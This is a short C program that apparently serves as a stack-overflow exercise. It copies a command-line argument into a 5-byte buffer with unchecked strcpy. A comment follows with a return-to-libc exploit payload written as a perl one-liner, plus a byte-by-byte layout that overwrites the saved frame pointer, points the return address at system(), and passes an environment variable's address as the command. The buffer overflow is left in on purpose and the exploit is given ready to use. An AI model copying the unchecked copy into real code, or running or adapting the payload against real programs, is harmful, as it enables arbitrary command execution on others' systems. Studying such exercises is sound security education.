#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
  char buffer[5];
  strcpy(buffer, argv[1]);
  return 0;
}

/*
`perl -e 'print "AAAAAEBPP\x50\xb2\xe5\xf7FAKE\xe5\xdd\xff\xff"'`

5 bytes for buffer
4 bytes for EBP
4 bytes of return address (pointed to system)
4 bytes of FAKE return address
4 bytes of environment variable's address for the arg of the system call
*/
